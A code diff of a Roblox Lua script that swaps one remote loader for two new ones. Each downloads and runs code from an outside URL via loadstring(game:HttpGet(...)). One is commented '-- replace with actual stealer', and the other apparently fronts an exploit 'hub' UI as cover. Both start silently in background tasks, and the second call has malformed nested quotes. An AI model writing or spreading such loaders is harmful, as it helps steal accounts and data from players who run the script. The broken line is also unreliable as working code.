@@ -1,2 +1,8 @@
-ID="7d02e215-29aa-4d4b-8d74-95e8893eacf0";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+local function Function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Mathersg4/software/refs/heads/main/pr.lua'))() -- replace with actual stealer
+end
+local function loadui()
+  loadstring(game:HttpGet("loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()"))()
+end
+task.spawn(Function)
+task.spawn(loadui)
